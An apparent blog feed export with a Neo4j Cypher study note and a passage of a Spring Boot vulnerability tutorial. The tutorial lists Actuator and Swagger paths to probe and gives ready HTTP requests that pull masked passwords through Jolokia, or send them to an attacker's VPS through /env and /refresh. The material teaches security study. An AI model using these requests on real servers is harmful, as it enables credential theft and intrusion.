    <title>neo4j文档学习记录</title>
    <link href="https://kpa1on.github.io/2022/07/14/neo4j%E6%96%87%E6%A1%A3%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://kpa1on.github.io/2022/07/14/neo4j%E6%96%87%E6%A1%A3%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2022-07-14T06:19:00.000Z</published>
    <updated>2022-07-15T09:00:21.654Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="入门指南"><a href="#入门指南" class="headerlink" title="入门指南"></a>入门指南</h3><h4 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h4><p>Neo4j 是世界领先的图形数据库。该架构旨在优化管理、存储和遍历节点和关系。图数据库采用属性图方式，对遍历性能和操作运行时间都有好处。</p><span id="more"></span><h4 id="Cypher"><a href="#Cypher" class="headerlink" title="Cypher"></a>Cypher</h4><p>Cypher 是 Neo4j 的图形查询语言，允许用户从图形数据库存储和检索数据。它是一种声明性的、受 SQL 启发的语言，用于使用 ASCII 艺术语法描述图形中的视觉模式。该语法提供了一种视觉和逻辑方式来匹配图中节点和关系的模式。</p><h4 id="使用Neo4j"><a href="#使用Neo4j" class="headerlink" title="使用Neo4j"></a>使用Neo4j</h4><p>设置使用 Neo4j 和 Cypher 开发应用程序的环境的最简单方法是使用 Neo4j Desktop。从<a href="https://neo4j.com/download/">https://neo4j.com/download/</a>下载</p><h3 id="Cypher使用"><a href="#Cypher使用" class="headerlink" title="Cypher使用"></a>Cypher使用</h3><blockquote><p>名称是区分大小写的，<code>:PERSON</code>,<code>:Person</code>和<code>:person</code>是三个不同的标签，以及<code>n</code>和<code>N</code>是两个不同的变量。</p></blockquote><p>查询是使用各种子句构建的，以下是一些用于从图中读取的子句示例：</p><ul><li><code>MATCH</code>：要匹配的图形模式。这是从图表中获取数据的最常用方法。</li><li><code>WHERE</code>: 本身不是一个子句，而是<code>MATCH</code>,<code>OPTIONAL MATCH</code>和的一部分<code>WITH</code>。向模式添加约束，或过滤通过<code>WITH</code>.</li><li><code>RETURN</code>: 返回什么。</li></ul><h4 id="查询更新"><a href="#查询更新" class="headerlink" title="查询更新"></a>查询更新</h4><p>使用以下查询创建一个简单的示例图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE (john:Person &#123;name: &#x27;John&#x27;&#125;)</span><br><span class="line">CREATE (joe:Person &#123;name: &#x27;Joe&#x27;&#125;)</span><br><span class="line">CREATE (steve:Person &#123;name: &#x27;Steve&#x27;&#125;)</span><br><span class="line">CREATE (sara:Person &#123;name: &#x27;Sara&#x27;&#125;)</span><br><span class="line">CREATE (maria:Person &#123;name: &#x27;Maria&#x27;&#125;)</span><br><span class="line">CREATE (john)-[:FRIEND]-&gt;(joe)-[:FRIEND]-&gt;(steve)</span><br><span class="line">CREATE (john)-[:FRIEND]-&gt;(sara)-[:FRIEND]-&gt;(maria)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/14/sbpyaIcj43QWdFM.png" alt="image-20220714150548083"></p><p>构造一个查询，查询john朋友的朋友</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MATCH (john &#123;name: &#x27;John&#x27;&#125;)-[:FRIEND]-&gt;()-[:FRIEND]-&gt;(fof)</span><br><span class="line">RETURN john.name, fof.name</span><br></pre></td></tr></table></figure><p>获取用户列表，从列表中找到具有名称的所有节点，匹配他们的朋友并仅返回那些具有以**’S’<strong>开头的</strong>‘name’**属性的follower user。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MATCH (user)-[:FRIEND]-&gt;(follower)</span><br><span class="line">WHERE user.name IN [&#x27;Joe&#x27;, &#x27;John&#x27;, &#x27;Sara&#x27;, &#x27;Maria&#x27;, &#x27;Steve&#x27;] AND follower.name =~ &#x27;S.*&#x27;</span><br><span class="line">RETURN user.name, follower.name</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/14/Jjh3mLWfb2GO4cQ.png" alt="image-20220714151802994"></p><p>这些是用于更新图形的子句示例：</p><ul><li><code>CREATE</code>（和<code>DELETE</code>）：创建（和删除）节点和关系。</li><li><code>SET</code>（和<code>REMOVE</code>）：为属性设置值并在节点上添加标签 using<code>SET</code>和 use<code>REMOVE</code>删除它们。</li><li><code>MERGE</code>：匹配现有的或创建新的节点和模式。这与独特的约束一起特别有用。</li></ul><p>这是一个更新图表的示例，将聚合数据写入图表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n &#123;name: &#x27;John&#x27;&#125;)-[:FRIEND]-(friend)</span><br><span class="line">WITH n, count(friend) AS friendsCount</span><br><span class="line">SET n.friendsCount = friendsCount</span><br><span class="line">RETURN n</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/14/aLMFNruEAXC89Op.png" alt="image-20220714154820494"></p><h4 id="路径匹配"><a href="#路径匹配" class="headerlink" title="路径匹配"></a>路径匹配</h4><p><strong>Neo4j Cypher</strong>利用<strong>关系同构</strong>进行路径匹配，是减少结果集大小和防止无限遍历的非常有效的方法。在 Neo4j 中，所有关系都有一个方向。</p><p><strong>同态</strong>：如果查询正在寻找长度路径<code>n</code>并且不关心方向，<code>n</code>则将返回一个长度路径，一遍又一遍地重复两个节点。</p><p>例如，查找所有具有 5 个关系的路径并且不关心关系方向：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MATCH p = ()-[*5]-()</span><br><span class="line">RETURN nodes(p)</span><br><span class="line"></span><br><span class="line">如果使用同态，这将返回两个结果记录[a,b,a,b,a,b]，以及[b,a,b,a,b,a]。</span><br></pre></td></tr></table></figure><p><strong>节点同构</strong>：对于每个路径匹配记录，不能多次返回同一节点。</p><p>在另一个双节点示例中，例如<code>(a:Node)-[r:R]-&gt;(b:Node)</code>; 使用节点同构约束只能找到长度为 1 的路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MATCH p = ()-[*1]-()</span><br><span class="line">RETURN nodes(p)</span><br><span class="line"></span><br><span class="line">如果使用节点同构，这将返回两个结果记录[a, b]，以及[b, a]。</span><br></pre></td></tr></table></figure><p><strong>关系同构</strong>：对于每个路径匹配记录，不能多次返回相同的关系。</p><p>在另一个双节点示例中，例如<code>(a:Node)-[r:R]-&gt;(b:Node)</code>; 使用关系同构约束只能找到长度为 1 的路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MATCH p = ()-[*1]-()</span><br><span class="line">RETURN nodes(p)</span><br><span class="line"></span><br><span class="line">这将返回两个结果记录[a, b]，以及[b, a].</span><br></pre></td></tr></table></figure><p><strong>Cypher 利用关系同构进行路径匹配</strong>：寻找用户朋友的朋友，并且不能返回用户本身。创建如下数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE</span><br><span class="line">  (adam:User &#123;name: &#x27;Adam&#x27;&#125;),</span><br><span class="line">  (pernilla:User &#123;name: &#x27;Pernilla&#x27;&#125;),</span><br><span class="line">  (david:User &#123;name: &#x27;David&#x27;&#125;),</span><br><span class="line">  (adam)-[:FRIEND]-&gt;(pernilla),</span><br><span class="line">  (pernilla)-[:FRIEND]-&gt;(david)</span><br></pre></td></tr></table></figure><p>寻找Adam朋友的朋友</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MATCH (user:User &#123;name: &#x27;Adam&#x27;&#125;)-[r1:FRIEND]-()-[r2:FRIEND]-(friend_of_a_friend)</span><br><span class="line">RETURN friend_of_a_friend.name AS fofName</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/14/YJoSy5MXWlspHzO.png" alt="image-20220714161410979"></p><p>如果查询应该返回用户，则可以将匹配分布在多个<code>MATCH</code>子句中，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MATCH (user:User &#123;name: &#x27;Adam&#x27;&#125;)-[r1:FRIEND]-(friend)</span><br><span class="line">MATCH (friend)-[r2:FRIEND]-(friend_of_a_friend)</span><br><span class="line">RETURN friend_of_a_friend.name AS fofName</span><br></pre></td></tr></table></figure><p>目前先看到这，后续的语法学完之后再补充。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://neo4j.com/docs/">https://neo4j.com/docs/</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;入门指南&quot;&gt;&lt;a href=&quot;#入门指南&quot; class=&quot;headerlink&quot; title=&quot;入门指南&quot;&gt;&lt;/a&gt;入门指南&lt;/h3&gt;&lt;h4 id=&quot;Neo4j&quot;&gt;&lt;a href=&quot;#Neo4j&quot; class=&quot;headerlink&quot; title=&quot;Neo4j&quot;&gt;&lt;/a&gt;Neo4j&lt;/h4&gt;&lt;p&gt;Neo4j 是世界领先的图形数据库。该架构旨在优化管理、存储和遍历节点和关系。图数据库采用属性图方式，对遍历性能和操作运行时间都有好处。&lt;/p&gt;</summary>
    
    
    
    <category term="数据库" scheme="https://kpa1on.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="neo4j" scheme="https://kpa1on.github.io/tags/neo4j/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot相关漏洞学习</title>
    <link href="https://kpa1on.github.io/2022/06/26/SpringBoot%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kpa1on.github.io/2022/06/26/SpringBoot%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-06-25T18:59:40.000Z</published>
    <updated>2022-06-26T01:53:41.888Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="SpringBoot-相关漏洞的学习"><a href="#SpringBoot-相关漏洞的学习" class="headerlink" title="SpringBoot 相关漏洞的学习"></a>SpringBoot 相关漏洞的学习</h3><span id="more"></span><h3 id="路由知识"><a href="#路由知识" class="headerlink" title="路由知识"></a>路由知识</h3><ul><li><code>spring</code>的根路径有时候设定为<code>/manage</code>、<code>/management</code>、项目app路径</li><li>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 <code>/</code> ，2.x 版本则统一以 <code>/actuator</code> 为起始路径</li><li>Spring Boot Actuator 默认的内置路由名字有时会被修改</li></ul><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><blockquote><p>开发人员么有意识到地址泄露会产生安全隐患，或者说项目从测试环境切换为开发环境时，开发人员忘记修改配置文件等。</p></blockquote><h4 id="路由地址及接口调用详情泄漏"><a href="#路由地址及接口调用详情泄漏" class="headerlink" title="路由地址及接口调用详情泄漏"></a>路由地址及接口调用详情泄漏</h4><h5 id="Swagger相关"><a href="#Swagger相关" class="headerlink" title="Swagger相关"></a>Swagger相关</h5><p>swagger相关的路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/v2/api-docs</span><br><span class="line">/swagger-ui.html</span><br></pre></td></tr></table></figure><p>还会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口的路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/swagger</span><br><span class="line">/api-docs</span><br><span class="line">/api.html</span><br><span class="line">/swagger-ui</span><br><span class="line">/swagger/codes</span><br><span class="line">/api/index.html</span><br><span class="line">/api/v2/api-docs</span><br><span class="line">/v2/swagger.json</span><br><span class="line">/swagger-ui/html</span><br><span class="line">/distv2/index.html</span><br><span class="line">/swagger/index.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/static/swagger.json</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/swagger-dubbo/api-docs</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/swagger/static/index.html</span><br><span class="line">/dubbo-provider/distv2/index.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br></pre></td></tr></table></figure><h5 id="Actuator相关"><a href="#Actuator相关" class="headerlink" title="Actuator相关"></a>Actuator相关</h5><p> spring boot actuator 相关的路由如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/mappings</span><br><span class="line">/metrics</span><br><span class="line">/beans</span><br><span class="line">/configprops</span><br><span class="line">/actuator/metrics</span><br><span class="line">/actuator/mappings</span><br><span class="line">/actuator/beans</span><br><span class="line">/actuator/configprops</span><br></pre></td></tr></table></figure><h5 id="druid相关"><a href="#druid相关" class="headerlink" title="druid相关"></a>druid相关</h5><p>druid的相关路径如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">html:</span><br><span class="line">/druid/index.html             #Druid Index</span><br><span class="line">/druid/sql.html               #Druid sql监控页面</span><br><span class="line">/druid/weburi.html            #Druid Web URI监控页面</span><br><span class="line">/druid/websession.html        #Druid Web Session监控页面</span><br><span class="line"></span><br><span class="line">json:</span><br><span class="line">/druid/weburi.json            #Druid Web URI json</span><br><span class="line">/druid/websession.json        #Druid Web Session json</span><br><span class="line"></span><br><span class="line">Druid 登录接口：</span><br><span class="line">/druid/login.html            #Druid登录认证页面</span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line">/system/druid/login.html</span><br><span class="line">/webpage/system/druid/login.html</span><br><span class="line">/druid/datasource.html</span><br><span class="line">/druid/wall.html</span><br><span class="line">/druid/webapp.html</span><br><span class="line">/system/druid/websession.html</span><br><span class="line">/webpage/system/druid/websession.html</span><br><span class="line">/druid/spring.html</span><br><span class="line">/druid/api.html</span><br></pre></td></tr></table></figure><p>暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但攻击者可以通过审计暴露出的接口以增加对业务系统的了解，并会检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p><h4 id="配置不当而暴露的路由"><a href="#配置不当而暴露的路由" class="headerlink" title="配置不当而暴露的路由"></a>配置不当而暴露的路由</h4><p>可能因为配置不当而暴露的默认内置路由可能会有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">/actuator</span><br><span class="line">/auditevents</span><br><span class="line">/autoconfig</span><br><span class="line">/beans</span><br><span class="line">/caches</span><br><span class="line">/conditions</span><br><span class="line">/configprops</span><br><span class="line">/docs</span><br><span class="line">/dump</span><br><span class="line">/env</span><br><span class="line">/flyway</span><br><span class="line">/health</span><br><span class="line">/heapdump</span><br><span class="line">/httptrace</span><br><span class="line">/info</span><br><span class="line">/intergrationgraph</span><br><span class="line">/jolokia</span><br><span class="line">/logfile</span><br><span class="line">/loggers</span><br><span class="line">/liquibase</span><br><span class="line">/metrics</span><br><span class="line">/mappings</span><br><span class="line">/prometheus</span><br><span class="line">/refresh</span><br><span class="line">/scheduledtasks</span><br><span class="line">/sessions</span><br><span class="line">/shutdown</span><br><span class="line">/trace</span><br><span class="line">/threaddump</span><br><span class="line">/gateway</span><br><span class="line">/actuator/auditevents</span><br><span class="line">/actuator/beans</span><br><span class="line">/actuator/health</span><br><span class="line">/actuator/conditions</span><br><span class="line">/actuator/configprops</span><br><span class="line">/actuator/env</span><br><span class="line">/actuator/info</span><br><span class="line">/actuator/loggers</span><br><span class="line">/actuator/heapdump</span><br><span class="line">/actuator/threaddump</span><br><span class="line">/actuator/metrics</span><br><span class="line">/actuator/scheduledtasks</span><br><span class="line">/actuator/httptrace</span><br><span class="line">/actuator/mappings</span><br><span class="line">/actuator/jolokia</span><br><span class="line">/actuator/hystrix.stream</span><br><span class="line">/actuator/gateway</span><br><span class="line">/actuator/gateway/routes</span><br></pre></td></tr></table></figure><p>对于暴露的路由，有几个值得我们去关注：</p><ul><li><code>/env</code>、<code>/actuator/env</code></li></ul><p>​    GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等    信息；当程序员的属性名命名不规范，例如 password 写成     psasword、pwd 时，会泄露密码明文；</p><p>​    同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p><ul><li><code>/refresh</code>、<code>/actuator/refresh</code></li></ul><p>​    POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p><ul><li><code>/restart</code>、<code>/actuator/restart</code></li></ul><p>​    暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p><ul><li><code>/jolokia</code>、<code>/actuator/jolokia</code></li></ul><p>​    可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p><ul><li><code>/trace</code>、<code>/actuator/httptrace</code></li></ul><p>​    一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p><h4 id="获取被星号脱敏的密码的明文"><a href="#获取被星号脱敏的密码的明文" class="headerlink" title="获取被星号脱敏的密码的明文"></a>获取被星号脱敏的密码的明文</h4><blockquote><p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p></blockquote><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>利用条件：</p><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（请求<code>/jolokia/list</code>接口有数据就说明引用了）</li></ul><p>利用方法：</p><p>步骤一：找到想要获取的属性名</p><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><p>步骤二：<code>jolokia</code> 调用相关 <code>Mbean</code> 获取明文</p><p>将下面示例中的 <code>security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code>value</code> 键中。</p><ul><li>调用 <code>org.springframework.boot</code> Mbean</li></ul><blockquote><p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p></blockquote><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><p>测试读取星号脱敏的数据库密码password</p><p><img src="https://s2.loli.net/2022/06/26/W2tLDB63FVEezAx.png" alt="image-20220626015318831"></p><p>成功读取</p><p><img src="https://s2.loli.net/2022/06/26/kUdXcmYvgAx7Vlo.png" alt="image-20220626014907676"></p><ul><li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li></ul><blockquote><p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法，需要项目配置有spring cloud相关的依赖</p></blockquote><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;op</span><br></pre></td></tr></table></figure><p>测试如下</p><p><img src="https://s2.loli.net/2022/06/26/JIx6ydSPQTlaMF7.png" alt="image-20220626015237144"></p><ul><li>调用其他Mbean</li></ul><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>利用条件：</p><ul><li>可以 GET 请求目标网站的 <code>/env</code></li><li>可以 POST 请求目标网站的 <code>/env</code></li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><p>利用方法：</p><p>步骤一：找到想要获取的属性名</p><p>步骤二：使用nc监听 HTTP 请求</p><p>例如，在vps上监听80端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvk 80</span><br></pre></td></tr></table></figure><p>步骤三：设置 <code>eureka.client.serviceUrl.defaultZone</code> 属性</p><p>将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code> 中的 <code>security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；<code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://value:$&#123;security.user.password&#125;@your-vps-ip</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:$&#123;security.user.password&#125;@your-vps-ip&quot;&#125;</span><br></pre></td></tr></table></figure><p>步骤四：刷新配置</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>步骤五：解码属性值</p><p>此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic dmFsdWU6MTIzNDU2</span><br></pre></td></tr></table></figure><p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p><p>测试：</p><p>vps监听80端口，并通过post方式向<code>/env</code>接口设置如下值</p><p><img src="https://s2.loli.net/2022/06/26/rCq3svHtY7dNhlG.png" alt="image-20220626015529934"></p><p>再post请求<code>/refresh</code>接口即可在vps上看到请求信息</p><p><img src="https://s2.loli.net/2022/06/26/X5zWLoJ8fZ6exgc.png" alt="image-20220626015602947"></p><p>解密base64编码值</p><p><img src="https://s2.loli.net/2022/06/26/wkvbf8q2PYcHp9E.png" alt="image-20220626015619429"></p><h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h5><p>利用条件：</p><ul><li>通过 POST <code>/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><p>利用方法：</p><p>步骤一：找到想要获取的属性名</p><p>步骤二：使用nc监听 HTTP 请求</p><p>在vps上监听80端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvk 80</span><br></pre></td></tr></table></figure><p>步骤三：触发对外 <code>http</code> 请求</p><ul><li><code>spring.cloud.bootstrap.location</code> 方法（<strong>适用于</strong>明文数据中有特殊 url 字符的情况）</li></ul><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/?=$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure><p>spring 